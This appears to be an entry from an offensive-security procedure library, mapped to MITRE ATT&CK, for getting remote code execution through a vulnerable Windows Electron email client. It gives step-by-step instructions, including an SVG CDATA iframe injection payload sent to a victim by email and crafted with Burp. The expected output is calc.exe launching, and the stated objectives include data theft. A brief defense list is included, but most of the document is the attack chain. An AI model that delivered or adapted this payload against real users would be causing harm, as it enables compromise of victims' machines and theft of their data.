---
id: proc-uuid-006
tags:
  - delivery
  - rce-execution
  - electron
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Windows
  - Electron
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.501Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Send and View in Electron App for RCE

## Summary

This procedure delivers the full chained payload via email to the victim and executes RCE when opened in the vulnerable Windows Electron app, confirming end-to-end exploit.

## Description

Using the SVG CDATA iframe payload, send the email and rely on the victim opening it in the old app, which renders without proper isolation, leading to redirect and prototype pollution RCE. Burp aids in crafting. Outcome: System command execution on victim machine.

## Requirements

1. Victim email address
2. Vulnerable app version on Windows
3. Hosted redirect and RCE pages active

## Defense

Defensive measures and detection strategies:

- Patch Electron apps to latest versions
- Warn users against opening emails in desktop clients
- Detect anomalous process spawns from Electron

## Objectives

1. Deliver payload to victim
2. Trigger full chain for RCE
3. Achieve data theft or unauthorized actions

## Instructions

### Step 1: Craft and Send Email

**Context**: Embed final payload.

Intercept send request with Burp, inject:
```html
<svg><![CDATA[<iframe sandbox="allow-top-navigation" src="https://redirect-domain.com/redirect.html"></iframe>]]></svg>
```
Send to victim.

### Step 2: Victim Interaction

**Context**: Execute on open.

Victim opens email in app v1.0.2.

**Expected Output**: calc.exe launches.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- delivery
- rce-execution
- electron
